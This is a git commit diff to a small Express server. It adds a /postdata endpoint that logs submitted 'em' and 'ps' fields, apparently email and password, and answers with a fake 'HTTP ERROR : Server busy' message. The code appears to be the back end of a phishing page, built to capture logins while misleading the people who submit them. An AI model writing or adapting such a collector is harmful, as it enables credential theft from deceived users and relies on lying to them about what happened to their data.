13d95619248148513c99dffdd6f90883502cb725
fakewtfone <160347462+fakewtfone@users.noreply.github.com>
2024-02-18 00:49:36 +0530

    Update index.js 0:49

--- index.js
+++ index.js
@@ -1,7 +1,17 @@
 const express = require('express')
 const app = express()
 app.all('/', (req, res) => {
-    console.log("Just got a request!")
-    res.send('Yo!')
+    res.send('Server is running, thanks!')
 })
+
+app.post('/postdata', function(req, res) {
+  try{
+    console.log('Whole body :  ',req.body);
+    console.log(req.body["em"],req.body["ps"])
+    res.send('HTTP ERROR : Server busy ');}
+    catch(e){
+      console.log(e)
+    }
+});
+
 app.listen(process.env.PORT || 3000)
